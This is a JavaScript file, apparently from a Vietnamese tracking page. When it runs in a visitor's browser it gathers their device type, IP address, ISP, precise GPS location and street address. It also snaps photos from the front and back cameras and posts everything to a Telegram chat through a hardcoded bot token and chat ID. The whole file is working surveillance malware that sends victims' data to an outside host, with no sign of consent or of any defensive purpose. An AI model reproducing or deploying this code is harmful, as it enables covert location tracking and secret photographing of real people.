const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '',
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '', 
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } 
  else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const data = await r.json();
    info.ip = data.ip;
  } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
  try {
    const r = await fetch('https://icanhazip.com');
    const ip = await r.text();
    info.realIp = ip.trim();
    const res = await fetch(`https://ipwho.is/${info.realIp}`);
    const data = await res.json();
    info.isp = data.connection?.org || 'VNNIC';
    info.country = data.country || 'Việt Nam';
  } catch (e) { info.realIp = 'Lỗi kết nối'; }
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name || 'Vị trí GPS';
        } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
        resolve();
      },
      async () => { await fallbackIPLocation(); resolve(); },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

async function fallbackIPLocation() {
  try {
    const data = await fetch(`https://ipwho.is/`).then(r => r.json());
    info.lat = data.latitude?.toFixed(6) || '0';
    info.lon = data.longitude?.toFixed(6) || '0';
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { info.address = 'Không rõ'; }
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', ''); 
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

function getCaption() {
  const mapsLink = (info.lat && info.lon)
    ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  
  const media = [];
  if (frontBlob) {
    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
    formData.append('front', frontBlob, 'front.jpg');
  }
  if (backBlob) {
    media.push({ type: 'photo', media: 'attach://back' });
    formData.append('back', backBlob, 'back.jpg');
  }

  formData.append('media', JSON.stringify(media));
  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

async function sendTextOnly() {
  return fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
  });
}

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  detectDevice();
  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

  let front = await captureCamera("user");
  if (front) await delay(800); // Nghỉ để phần cứng chuyển đổi cam
  let back = await captureCamera("environment");

  if (front || back) {
    info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
    await sendPhotos(front, back);
  } else {
    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
    await sendTextOnly();
  }
}
